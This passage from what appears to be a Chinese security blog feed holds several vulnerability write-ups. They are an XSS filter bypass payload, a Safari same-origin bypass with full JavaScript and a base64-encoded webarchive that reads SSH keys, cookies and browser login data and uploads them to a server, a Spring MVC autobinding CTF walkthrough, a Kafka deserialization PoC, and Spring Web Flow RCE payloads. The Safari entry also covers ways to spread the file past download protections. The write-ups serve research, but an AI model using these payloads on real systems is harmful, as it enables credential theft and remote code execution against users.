源码中使用mb_convert_case去转换字符，默认用utf-8编码，从上面的unicode映射可知ſ [\u17f]映射为大写字母S可以，以此来绕过str_ireplace的检测, ſ [\u17f]utf-8编码为0xc40xbf Paylaod: x=&lt;%C5%BFcript/src=./1&gt;&lt;/script&gt; ​]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过Safari同源策略，偷取本地文件]]></title>
    <url>%2F2017%2F08%2F07%2F%E7%BB%95%E8%BF%87Safari%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%8C%E5%81%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[国外研究者Bo0om公开了一种利用Safari同源策略绕过，读取本地文件并上传至远程服务器的攻击手法，并给出了PoC, 地址: https://github.com/Bo0oM/Safiler。一次有效的攻击，需要用户使用Safari浏览器本地读取(file://)恶意文档文件，因此攻击的范围是有限的，但是攻击手法中绕过同源策略和读取本地文件两种方式还是值得学习和研究的。 Safari 同源策略绕过受同源策略的限制，网页中用XMLHttpRequest对象读取本地文件是被禁止的，从错误信息中可以看出Safari浏览器跨源请求仅仅支持HTTP,但实际情况却并非如此。 当Safari浏览器访问本地文件时，并不执行同源策略，用file协议打开一个HTML文件，包含在文件内的JavaScript代码可以绕过同源策略, 访问本地或远程文件。这样就可以做到读取本地文件，然后将文件内容发送给远程服务器了。 这个问题15年就有报道过，至今苹果也没有处理，可能是，默认情况下javascript不能列举本地目录，影响范围有限。但是结合苹果系统自身的特性，利用.DS_Store文件来读取文件夹目录，这样攻击效果就很可观了，这也是本次介绍的攻击方式中一个值得研究的利用手段。 读取本地文件.DS_store(Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。默认情况下，Mac OS X的Finder程序会在打开过的每个目录下创建.DS_Store文件(引自维基百科)。 从.DS_store文件中可以解析出当前目录中的所有的文件名，解析代码如下: 1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom ds_store import DSStoreimport jsonpath = './.DS_Store'def parse(file): filelist = [] for i in file: if i.filename != '.': filelist.append(i.filename) return list(set(filelist))d = DSStore.open(path, 'r+')fileresult = parse(d)print(json.dumps(fileresult))for name in fileresult: try: d = DSStore.open(path + name+ '/.DS_Store', 'r+') fileresult = parse(d) all.append(fileresult) print(json.dumps(fileresult)) except: pass 运行: python parse_ds.py, 可以解析出当前目录下所有的文件名。 苹果系统中有价值的数据基本都在用户目录下，而不同电脑的用户名是不一样的。如果不知道用户名，那么就难以用file协议读取用户目录中.DS_store文件的内容，攻击效果将大打折扣。苹果系统中/etc/passwd文件是不含用户名信息的，但是在/var/log/system.log和 /var/log/install.log这两个系统创建的日志信息中, 通常都包含了用户的路径信息，可以通过简单的正则表达式进行匹配。 123456789101112function getUser() &#123; var xhr = new XMLHttpRequest(); try &#123; xhr.open('GET', '/var/log/system.log;/https:%2f%2fgoogle.com/', false); xhr.send(); return xhr.responseText.match(//Users/w+//g)[0]; &#125; catch (e) &#123; xhr.open('GET', '/var/log/install.log;/https:%2f%2fgoogle.com/', false); xhr.send(); return xhr.responseText.match(//Users/w+//g)[0]; &#125;&#125; 这样就可以获取了完整的文件访问路径，结合.DS_Store文件内容获得文件和文件夹的层次结构。但是注意到，通常情况下只有用Finder打开的目录才会创建.DS_Store文件，而一些敏感文件目录通常是没有.DS_Store文件的，例如:~/.ssh。要获取这类的敏感文件，可以人为收集一些常见的敏感文件路径，弥补利用.DS_Store文件读取的不足。 常见的一些敏感文件路径有 123456789101112131415~/.ssh/id_rsa;~/.ssh/id_rsa.key;~/.ssh/id_rsa.pub;~/.ssh/known_hosts;~/.ssh/authorized_keys~/Library/Cookies/Cookies.binarycookies~/Library/Cookies/com.apple.Safari.cookies# 系统账户信息~/Library/Accounts/Accounts4.sqlite~/Library/Application Support/Google/Chrome/Default/Login Data~/Library/Application Support/Google/Chrome/Default/Cookies~/Library/Application Support/Google/Chrome/Default/History Safari打开恶意文档Safari打开本地创建的恶意xhtm文件PoC.xhtm，本地开启一个服务器接收发送的文件内容, 并解析.DS_Store文件的内容返回给前端js继续读取本地文件，核心代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465function processFile(file) &#123; let out = getFile(file), xhr = new XMLHttpRequest(), formData = new FormData() if (!out) return false; formData.append('file', out, file); xhr.open('POST', serverUrl); xhr.onreadystatechange = () =&gt; &#123; if (xhr.readyState === 4 &amp;&amp; xhr.status === 200 &amp;&amp; xhr.responseText.length &gt; 3) &#123; let response = JSON.parse(xhr.responseText); response.forEach(responseFile =&gt; &#123; let path = file.slice(0, file.lastIndexOf('/') + 1); if (processFile(path + responseFile) != true) &#123; processFile(path + responseFile + '/.DS_Store'); &#125; &#125;) &#125; &#125;; xhr.send(formData); return true&#125;function getUser() &#123; var xhr = new XMLHttpRequest(); try &#123; xhr.open('GET', '/var/log/system.log;/https:%2f%2fgoogle.com/', false); xhr.send(); var users = unique(xhr.responseText.match(/\/Users\/\w+\//g)); &#125; catch (e) &#123; xhr.open('GET', '/var/log/install.log;/https:%2f%2fgoogle.com/', false); xhr.send(); var users = unique(xhr.responseText.match(/\/Users\/\w+\//g)); &#125; finally &#123; return users.find((userstring) =&gt; &#123; var xhr = new XMLHttpRequest(); xhr.open('GET', userstring + '.DS_Store', false); xhr.send(); return xhr.responseText.length &gt; 0 &#125;); &#125;&#125;function getFile(file) &#123; var xhr = new XMLHttpRequest(); try &#123; console.log(file); xhr.open('GET', file + ';/https:%2f%2fgoogle.com/', false); xhr.responseType = 'blob'; xhr.send(); if (xhr.response.size != 0) return xhr.response &#125; catch (e) &#123; console.log(e) &#125;&#125; 打开这种本地创建的文件，可以看出攻击是有效的,文件内容会被存储到远程服务器上。 如果文档不是用Safari打开的，而是用其他浏览器打开本地的HTML文档，如Chrome或Firefox, 那么什么也不会发生，幸运的是, 存在一种默认情况下用Safari浏览器打开的文件格式webarchive, webarchive文件是设计为在mscOS和windows系统上用Safari浏览器预览或保存网页，其格式不同于标准的HTML文件格式。设计一个恶意的webarchive格式文件如下 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt; &lt;key&gt;WebMainResource&lt;/key&gt; &lt;dict&gt; &lt;key&gt;WebResourceData&lt;/key&gt; &lt;data&gt; PHNjcmlwdD5jb25zdCBzZXJ2ZXJVcmw9J2h0dHA6Ly8wOjUwMDAnLHVzZXI9Z2V0VXNlcigpLGxpc3Q9Wycuc3NoL2lkX3JzYScsJy5zc2gva25vd25faG9zdHMnLCcuc3NoL2F1dGhvcml6ZWRfa2V5cycsJy5iYXNoX2hpc3RvcnknLCdMaWJyYXJ5L0Nvb2tpZXMvQ29va2llcy5iaW5hcnljb29raWVzJywnTGlicmFyeS9Db29raWVzL0hTVFMucGxpc3QnLCdMaWJyYXJ5L0Nvb2tpZXMvY29tLmFwcGxlLlNhZmFyaS5jb29raWVzJywnTGlicmFyeS9BY2NvdW50cy9BY2NvdW50czQuc3FsaXRlJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0Nocm9taXVtL0RlZmF1bHQvTG9naW4gRGF0YScsJ0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9DaHJvbWl1bS9EZWZhdWx0L0Nvb2tpZXMnLCdMaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvQ2hyb21pdW0vRGVmYXVsdC9IaXN0b3J5JywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9Mb2dpbiBEYXRhJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9Db29raWVzJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9IaXN0b3J5JywnLlRyYXNoLy5EU19TdG9yZScsJ0RvY3VtZW50cy8uRFNfU3RvcmUnLCdEZXNrdG9wLy5EU19TdG9yZScsXS5tYXAoZmlsZT0+dXNlcisgZmlsZSk7bWFpbigpO2Z1bmN0aW9uIG1haW4oKXtsaXN0LmZvckVhY2gocHJvY2Vzc0ZpbGUpO30KZnVuY3Rpb24gdW5pcXVlKGFycil7dmFyIG9iaj17fTtmb3IodmFyIGk9MDtpPGFyci5sZW5ndGg7aSsrKXt2YXIgc3RyPWFycltpXTtvYmpbc3RyXT10cnVlO30KcmV0dXJuIE9iamVjdC5rZXlzKG9iaik7fQpmdW5jdGlvbiBwcm9jZXNzRmlsZShmaWxlKXtsZXQgb3V0PWdldEZpbGUoZmlsZSkseGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpLGZvcm1EYXRhPW5ldyBGb3JtRGF0YSgpCmlmKCFvdXQpcmV0dXJuIGZhbHNlO2Zvcm1EYXRhLmFwcGVuZCgnZmlsZScsb3V0LGZpbGUpO3hoci5vcGVuKCdQT1NUJyxzZXJ2ZXJVcmwpO3hoci5vbnJlYWR5c3RhdGVjaGFuZ2U9KCk9PntpZih4aHIucmVhZHlTdGF0ZT09PTQmJnhoci5zdGF0dXM9PT0yMDAmJnhoci5yZXNwb25zZVRleHQubGVuZ3RoPjMpe2xldCByZXNwb25zZT1KU09OLnBhcnNlKHhoci5yZXNwb25zZVRleHQpO3Jlc3BvbnNlLmZvckVhY2gocmVzcG9uc2VGaWxlPT57bGV0IHBhdGg9ZmlsZS5zbGljZSgwLGZpbGUubGFzdEluZGV4T2YoJy8nKSsgMSk7aWYocHJvY2Vzc0ZpbGUocGF0aCsgcmVzcG9uc2VGaWxlKSE9dHJ1ZSl7cHJvY2Vzc0ZpbGUocGF0aCsgcmVzcG9uc2VGaWxlKycvLkRTX1N0b3JlJyk7fX0pfX07eGhyLnNlbmQoZm9ybURhdGEpO3JldHVybiB0cnVlfQpmdW5jdGlvbiBnZXRVc2VyKCl7dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTt0cnl7eGhyLm9wZW4oJ0dFVCcsJ2ZpbGU6Ly8vdmFyL2xvZy9zeXN0ZW0ubG9nOy9odHRwczolMmYlMmZnb29nbGUuY29tLycsZmFsc2UpO3hoci5zZW5kKCk7dmFyIHVzZXJzPXVuaXF1ZSh4aHIucmVzcG9uc2VUZXh0Lm1hdGNoKC9cL1VzZXJzXC9cdytcLy9nKSk7fWNhdGNoKGUpe3hoci5vcGVuKCdHRVQnLCdmaWxlOi8vL3Zhci9sb2cvaW5zdGFsbC5sb2c7L2h0dHBzOiUyZiUyZmdvb2dsZS5jb20vJyxmYWxzZSk7eGhyLnNlbmQoKTt2YXIgdXNlcnM9dW5pcXVlKHhoci5yZXNwb25zZVRleHQubWF0Y2goL1wvVXNlcnNcL1x3K1wvL2cpKTt9ZmluYWxseXtyZXR1cm4gdXNlcnMuZmluZCgodXNlcnN0cmluZyk9Pnt2YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLHVzZXJzdHJpbmcrJy5EU19TdG9yZScsZmFsc2UpO3hoci5zZW5kKCk7cmV0dXJuIHhoci5yZXNwb25zZVRleHQubGVuZ3RoPjB9KTt9fQpmdW5jdGlvbiBnZXRGaWxlKGZpbGUpe3ZhciB4aHI9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7dHJ5e2NvbnNvbGUubG9nKGZpbGUpO3hoci5vcGVuKCdHRVQnLGZpbGUrJzsvaHR0cHM6JTJmJTJmZ29vZ2xlLmNvbS8nLGZhbHNlKTt4aHIucmVzcG9uc2VUeXBlPSdibG9iJzt4aHIuc2VuZCgpO2lmKHhoci5yZXNwb25zZS5zaXplIT0wKXJldHVybiB4aHIucmVzcG9uc2V9Y2F0Y2goZSl7Y29uc29sZS5sb2coZSl9fQo8L3NjcmlwdD4= &lt;/data&gt; &lt;key&gt;WebResourceFrameName&lt;/key&gt; &lt;string&gt;&lt;/string&gt; &lt;key&gt;WebResourceMIMEType&lt;/key&gt; &lt;string&gt;text/html&lt;/string&gt; &lt;key&gt;WebResourceTextEncodingName&lt;/key&gt; &lt;string&gt;UTF-8&lt;/string&gt; &lt;key&gt;WebResourceURL&lt;/key&gt; &lt;string&gt;file://&lt;/string&gt; &lt;/dict&gt;&lt;/dict&gt;&lt;/plist&gt; 上面data中的base64数据解码就是一段恶意的javascript脚本。 网络传播xhtm文件是不是只要Safari本地打开类似xhtm恶意文档，攻击都能生效呢？结果并不是，macOS文件是有属性信息的，从网上下载的文件会有来源信息， 如: http://127.0.0.1:8000/Poc.xhtm, 本地打开这种文件，攻击并不生效。 可见，打开带网络来源属性的的文件，会被Safari的同源策略拦截，导致攻击不能生效，那么通过邮件发送恶意文件再本地打开的方式，也是难以成功了。 那么是不是没有办法进行网络传播了呢，答案是否定的，macOS上的应用并不是都会保留文件的网络属性。 文件压缩 macOS自带的解压工具解压文件仍旧会保留网络属性，但是第三方应用如:Entropy解压文件会丢失网络属性，然后用Safari本地打开可导致攻击成功。那么可以将文件压缩为macOS自带解压工具解压不了的格式，如: 7z, rar等，然后通过网络下载或邮件进行传播。 社交软件传播 使用微信和QQ接收文件，仍旧会保留网络属性，无法成功利用 感谢wupco，给出了一种可以用来网络传播html文档进行攻击的方式，利用iframe下载webarchive文件后本地读取webarchive文件进行攻击的方式。 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;test&lt;script&gt; function exp()&#123; var iframe2 = document.createElement('iframe'); iframe2.src="./PoC0.webarchive"; document.body.appendChild(iframe2); &#125; var iframe = document.createElement('iframe'); iframe.src="http://0:8000/PoC0.webarchive"; document.body.appendChild(iframe); setTimeout("exp()",1500);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 网络传播webarchive文件测试发现，通过网页或邮件等方式下载到本地的webarchive文件，用Safari打开，攻击是有效的。 唯一不足的是Safari会弹一个警示框显示文件是网络下载的，需要用户确认才能打开。 防御针对这种攻击，有效的防御就是不要使用Safari浏览器打开本地文件, 不要将默认浏览器设置为Safari, 修改为Chrome等浏览器。 Ref https://xakep.ru/2017/07/06/safari-localfile-read/ https://lab.wallarm.com/hunting-the-files-34caa0c1496 http://resources.infosecinstitute.com/bypassing-same-origin-policy-sop-part-2/#article https://www.ifshow.com/detailed-and-bypass-the-same-origin-policy/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>同源策略</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring MVC 自动绑定漏洞]]></title>
    <url>%2F2017%2F07%2F22%2FSpring-MVC-%E8%87%AA%E5%8A%A8%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[简介软件框架有时允许开发人员自动将HTTP请求参数绑定到程序代码变量或对象中，从而使开发人员更容易地使用该框架。攻击者就可以利用这种方法通过构造http请求，将请求参数绑定到对象上，当代码逻辑使用该对象参数时就可能产生一些不可预料的结果。 在Spring mvc中，注解@ModelAttribute是一个非常常用的注解，其功能主要在两方面： 运用在参数上，会将客户端传递过来的参数按名称注入到指定对象中，并且会将这个对象自动加入ModelMap中，便于View层使用； 运用在方法上，会在每一个@RequestMapping标注的方法前执行，如果有返回值，则自动将该返回值加入到ModelMap中； SessionAttributes注解 在默认情况下，ModelMap 中的属性作用域是 request 级别，也就是说，当本次请求结束后，ModelMap 中的属性将销毁。如果希望在多个请求中共享 ModelMap 中的属性，必须将其属性转存到 session 中，这样 ModelMap 的属性才可以被跨请求访问。 Spring 允许我们有选择地指定 ModelMap 中的哪些属性需要转存到 session 中，以便下一个请求对应的 ModelMap 的属性列表中还能访问到这些属性。这一功能是通过类定义处标注 @SessionAttributes(“user”) 注解来实现的。SpringMVC 就会自动将 @SessionAttributes 定义的属性注入到 ModelMap 对象，在 setup action 的参数列表时，去 ModelMap 中取到这样的对象，再添加到参数列表。只要不去调用 SessionStatus 的 setComplete() 方法，这个对象就会一直保留在 Session 中，从而实现 Session 信息的共享 Justice Leaguejustice league是ZeroNigths HackQuest2016的一个web任务，为了让更多的人认识到自动绑定这一类型的漏洞而设计。源码下载地址: https://github.com/3wapp/ZeroNights-HackQuest-2016。 站点实现了注册登录忘记密码等功能，逻辑比较简单。 先注册一个账号，了解站点流程逻辑。 注册成功，登录后home出现提示信息，没有权限不能访问敏感信息，显然，第一步要拥有一个有权限的账号登录，那么忘记密码功能就很可能是突破点了。 忘记密码会先检查用户名，然后回答密保问题，回答成功就重置密码，明显，密保问题是关键，怎样知道管理员的用户名和密保很关键。先用test用户尝试去绕过密保问题重置密码，那么可以利用自动绑定漏洞重置密保问题，在第一步检查用户名，尝试添加参数answer=yellow，在第二步输入密保问题答案为: yellow时，发现回答错误，也就是利用自动绑定漏洞失败，极有可能第一步没有获取answer参数赋值给user对象，尝试在第二步中加入，answer参数，发现重置密码成功。 证明利用自动绑定漏洞成功。剩下的就只是找出管理员的用户名了，爆破用户名有user用户和admin用户。后续通过重置密保问题来重置密码就是一样的步骤了。 查看源码发现，检查用户名部分，只读取了username参数，根据username判断生成user实例，用户存在则放入Model中，ResetPasswordController类使用SessionAttribute(“user”)注解，则会自动把对象放入session中. 而后在resetViewQuestionHandler函数中，参数使用了ModelAttribute注解，会自动从session中提取出user，这仅仅只是处理GET请求。处理POST请求的resetQuestionHandler函数中 user参数附近并没有使用ModelAttribute注解，但是Spring MVC会自动从session中提取user，并且使用相同的逻辑，用http请求参数去自动绑定对应的用户参数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253@Controller@SessionAttributes("user")public class ResetPasswordController &#123; private static final Logger logger = LoggerFactory.getLogger(ResetPasswordController.class); @Autowired private UserService userService; @RequestMapping(value = "/reset", method = RequestMethod.GET) public String resetViewHandler() &#123; logger.info("Welcome reset ! "); return "reset"; &#125; @RequestMapping(value = "/reset", method = RequestMethod.POST) public String resetHandler(@RequestParam String username, Model model) &#123; logger.info("Checking username " + username); User user = userService.findByName(username); if (user == null) &#123; logger.info("there is no user with name " + username); model.addAttribute("error", "Username is not found"); return "reset"; &#125; model.addAttribute("user", user); return "redirect:resetQuestion"; &#125; @RequestMapping(value = "/resetQuestion", method = RequestMethod.GET) public String resetViewQuestionHandler(@ModelAttribute User user) &#123; logger.info("Welcome resetQuestion ! " + user); return "resetQuestion"; &#125; @RequestMapping(value = "/resetQuestion", method = RequestMethod.POST) public String resetQuestionHandler(@RequestParam String answerReset, SessionStatus status, User user, Model model) &#123; logger.info("Checking resetQuestion ! " + answerReset + " for " + user); if (!user.getAnswer().equals(answerReset)) &#123; logger.info("Answer in db " + user.getAnswer() + " Answer " + answerReset); model.addAttribute("error", "Incorrect answer"); return "resetQuestion"; &#125; status.setComplete(); String newPassword = GeneratePassword.generatePassowrd(10); user.setPassword(newPassword); userService.updateUser(user); model.addAttribute("message", "Your new password is " + newPassword); return "success"; 那么在处理get和post请求都是存在自动绑定漏洞的，测试get请求如下: http://127.0.0.1:8080/justiceleague/resetQuestion?answer=cc,后台可以看到: 16:28:46 INFO ResetPasswordController:50 - Welcome resetQuestion ! User [username=test, password=ZG3t0yorB9, isSupaAdministrata=false, email=abc@qq.com, answer=cc]，密保问题重置成功。 Spring MVC确实太聪明了，POST请求处理中没有使用ModelAttribute注解，竟然和GET请求处理使用相同的逻辑，这种隐形的坑怕是埋了不少雷吧。 Ref Autobinding vulns and Spring MVC video from the 29thmeeting of Defcon Russia Group (in Russian) https://www.owasp.org/index.php/Mass_Assignment_Cheat_Sheet https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf http://docs.spring.io/spring/docs/3.1.x/spring-framework-reference/html/mvc.html)]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【漏洞分析】Apache kafka反序列化漏洞]]></title>
    <url>%2F2017%2F07%2F20%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91Apache-kafka%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[漏洞简介Apache kafka组件反序列化漏洞是FileOffsetBackingStore类在反序列化本地文件时引发的，实际场景中用到的并不多，简单复现下做个记录。 漏洞复现测试源码如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import org.apache.commons.io.FileUtils;import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;import org.apache.kafka.connect.storage.FileOffsetBackingStore;import ysoserial.payloads.Jdk7u21;import ysoserial.payloads.CommonsCollections4;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.IOException;import java.io.ObjectOutputStream;import java.util.HashMap;import java.util.Map;/** * Created by js on 2017/7/20. */public class KafkaPoc &#123; public static void testKafkaDeser() throws Exception &#123; StandaloneConfig config; String projectDir = System.getProperty(&quot;user.dir&quot;); CommonsCollections4 cc4 = new CommonsCollections4(); Object o = cc4.getObject(&quot;touch vul&quot;);// Jdk7u21 jdk7u21 = new Jdk7u21();// Object o = jdk7u21.getObject(&quot;touch vul&quot;); byte[] ser = serialize(o); File tempFile = new File(projectDir + &quot;/payload.ser&quot;); FileUtils.writeByteArrayToFile(tempFile, ser); Map&lt;String, String&gt; props = new HashMap&lt;String, String&gt;(); props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG, tempFile.getAbsolutePath()); props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG, &quot;org.apache.kafka.connect.json.JsonConverter&quot;); props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG, &quot;org.apache.kafka.connect.json.JsonConverter&quot;); props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG, &quot;org.apache.kafka.connect.json.JsonConverter&quot;); props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG, &quot;org.apache.kafka.connect.json.JsonConverter&quot;); config = new StandaloneConfig(props); FileOffsetBackingStore restore = new FileOffsetBackingStore(); restore.configure(config); restore.start(); &#125; private static byte[] serialize(Object object) throws IOException &#123; ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bout); out.writeObject(object); out.flush(); return bout.toByteArray(); &#125; public static void main(String[] args) throws Exception&#123; KafkaPoc.testKafkaDeser(); &#125;&#125; pom.xml 1234567891011121314151617181920212223242526&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.poc&lt;/groupId&gt; &lt;artifactId&gt;kafkatest&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;connect-runtime&lt;/artifactId&gt; &lt;version&gt;0.11.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.kafka/connect-json --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;connect-json&lt;/artifactId&gt; &lt;version&gt;0.11.0.0&lt;/version&gt; &lt;!--&lt;scope&gt;test&lt;/scope&gt;--&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 执行程序会在本地新建一个名为”vul”的文件，证明漏洞存在。 漏洞分析上面验证代码逻辑简单，写的比较清晰，不具体分析了。可以看看FileOffsetBackingStore类的实现，configure方法获取&quot;offset.storage.file.filename&quot;指定的值实例化一个文件对象，start方法调用会调用load方法，而load方法中反序列化之前实例化的文件对象，触发反序列漏洞。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class FileOffsetBackingStore extends MemoryOffsetBackingStore &#123; private static final Logger log = LoggerFactory.getLogger(FileOffsetBackingStore.class); private File file; public FileOffsetBackingStore() &#123; &#125; public void configure(WorkerConfig config) &#123; super.configure(config); this.file = new File(config.getString(&quot;offset.storage.file.filename&quot;)); &#125; public synchronized void start() &#123; super.start(); log.info(&quot;Starting FileOffsetBackingStore with file &#123;&#125;&quot;, this.file); this.load(); &#125; public synchronized void stop() &#123; super.stop(); log.info(&quot;Stopped FileOffsetBackingStore&quot;); &#125; private void load() &#123; try &#123; ObjectInputStream is = new ObjectInputStream(new FileInputStream(this.file)); Object obj = is.readObject(); if(!(obj instanceof HashMap)) &#123; throw new ConnectException(&quot;Expected HashMap but found &quot; + obj.getClass()); &#125; Map&lt;byte[], byte[]&gt; raw = (Map)obj; this.data = new HashMap(); Iterator i$ = raw.entrySet().iterator(); while(i$.hasNext()) &#123; Entry&lt;byte[], byte[]&gt; mapEntry = (Entry)i$.next(); ByteBuffer key = mapEntry.getKey() != null?ByteBuffer.wrap((byte[])mapEntry.getKey()):null; ByteBuffer value = mapEntry.getValue() != null?ByteBuffer.wrap((byte[])mapEntry.getValue()):null; this.data.put(key, value); &#125; is.close(); &#125; catch (EOFException | FileNotFoundException var8) &#123; ; &#125; catch (ClassNotFoundException | IOException var9) &#123; throw new ConnectException(var9); &#125; &#125; Ref http://seclists.org/oss-sec/2017/q3/184 http://www.polaris-lab.com/index.php/archives/345/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【漏洞分析】Spring Web Flow框架远程代码执行(CVE-2017-4971)]]></title>
    <url>%2F2017%2F07%2F18%2F%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91Spring-Web-Flow%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2017-4971%2F</url>
    <content type="text"><![CDATA[漏洞简介漏洞是由于Spring Web Flow的数据绑定问题带来的表达式注入，从而导致任意代码执行。 Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力，具体可以参考Spring Web Flow 2.0 入门。 触发漏洞需要满足两个条件： MvcViewFactoryCreator 对象的useSpringBeanBinding 参数需要设置为false（默认值）。 flow view对象中设置BinderConfiguration对象为空 影响版本： Spring Web Flow 2.4.0 to 2.4.4 Older unsupported versions are also affected 漏洞复现漏洞测试源码为 https://github.com/spring-projects/spring-webflow-samples/tree/master/booking-mvc， 来源于Spring Web Flow官方的Example中的例子，booking-mvc中的某个流满足漏洞触发的条件 flow view对象中设置BinderConfiguration对象为空 path: src/main/webapp/WEB-INF/hotels/booking/booking-flow.xml可以看出booking model中的confirm没有设置binder，也就是说在confirm阶段是可以触发漏洞的。 useSpringBeanBinding 参数设置为false参数默认是false, 但是在官方例子中设置为true了, 需要改源码如下: path: src/main/java/org/springframework/webflow/samples/booking/config/WebFlowConfig.java修改源码后，部署环境，然后访问，随便选取一个酒店进行预定。 预定第二步拦截确认请求，增加post参数_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty如下，返回响应头中包含vulnerable: True, 验证漏洞。 1234567891011121314151617181920212223242526POST /hotels/booking?execution=e1s2 HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: application/x-www-form-urlencodedContent-Length: 203Referer: http://127.0.0.1:8080/hotels/booking?execution=e1s2Cookie: JSESSIONID=BF4269E94E8F9108D72B2FB9864C6E53Connection: closeUpgrade-Insecure-Requests: 1_eventId_confirm=&amp;_csrf=92a961cd-69f5-4436-8834-a9b1e33ca87a&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1ntyHTTP/1.1 302 X-Content-Type-Options: nosniffX-XSS-Protection: 1; mode=blockCache-Control: no-storePragma: Expires: X-Frame-Options: DENYvulnerable: TrueLocation: /hotels/searchContent-Length: 0Date: Tue, 18 Jul 2017 06:23:18 GMTConnection: close 弹个计算器试试, payload:_(new+java.lang.ProcessBuilder(&quot;/usr/bin/open&quot;, &quot;/Applications/Calculator.app&quot;)).start()=iswin 漏洞流程view对象处理用户事件，会根据HTTP参数绑定相应的model。 如果model没有设置BinderConfiguration, 则会调用addDefaultMappings函数。 进一步查看addDefaultMappings函数，可以发现输入参数以fieldMarkerPrefix(“_”)开头，则会调用addEmptyValueMapping函数。 若useSpringBeanBinding参数设置为false,则 